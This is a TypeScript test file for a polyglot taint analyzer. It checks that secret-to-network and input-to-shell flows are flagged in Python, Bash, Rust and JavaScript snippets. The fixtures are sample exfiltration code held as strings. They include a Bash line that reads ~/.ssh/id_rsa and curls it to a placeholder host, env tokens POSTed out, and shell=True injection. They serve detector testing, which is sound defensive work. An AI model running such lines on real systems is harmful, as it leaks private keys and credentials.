// Runs under NODE (via `tsx --test`), not bun (tree-sitter native bindings).
import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { analyzeTaint } from "./index.ts";

const flows = (path: string, content: string) =>
	analyzeTaint([{ path, content }]).flows.length;

describe("polyglot taint (Python/Bash/Rust) + JS/TS dispatch", () => {
	test("Python: env secret -> network sink is flagged (exfiltration)", () => {
		assert.ok(
			flows(
				"a.py",
				'import os,requests\ns=os.getenv("SECRET")\nrequests.post("http://x",data=s)\n',
			) > 0,
		);
	});
	test("Python: source directly inside a sink argument is flagged", () => {
		assert.ok(
			flows(
				"b.py",
				'import os,requests\nrequests.post("http://x",data=os.environ.get("T"))\n',
			) > 0,
		);
	});
	test("Python: user input -> subprocess is flagged (injection)", () => {
		assert.ok(
			flows(
				"c.py",
				"import subprocess\nx=input()\nsubprocess.run(x,shell=True)\n",
			) > 0,
		);
	});
	test("Python: multi-hop taint propagates across assignments", () => {
		assert.ok(
			flows(
				"e.py",
				'import os,requests\na=os.getenv("K")\nb=a\nrequests.post("http://x",data=b)\n',
			) > 0,
		);
	});
	test("Python: benign code produces no false positive", () => {
		assert.equal(flows("d.py", "import math\nprint(math.sqrt(9))\n"), 0);
	});
	test("Bash: cat secret -> curl is flagged", () => {
		assert.ok(
			flows(
				"f.sh",
				'SECRET=$(cat /home/u/.ssh/id_rsa)\ncurl -d "$SECRET" http://x\n',
			) > 0,
		);
	});
	test("Bash: benign code produces no false positive", () => {
		assert.equal(flows("g.sh", "echo hi\nls -la\n"), 0);
	});
	test("Rust: env::var -> reqwest is flagged", () => {
		assert.ok(
			flows(
				"h.rs",
				'fn main(){ let s = std::env::var("S").unwrap(); reqwest::get(&s); }\n',
			) > 0,
		);
	});
	test("JS/TS dispatch still works via the TypeScript analyzer", () => {
		assert.ok(
			flows(
				"i.js",
				'const t=process.env.TOKEN;\nfetch("http://x",{method:"POST",body:t});\n',
			) > 0,
		);
	});
});
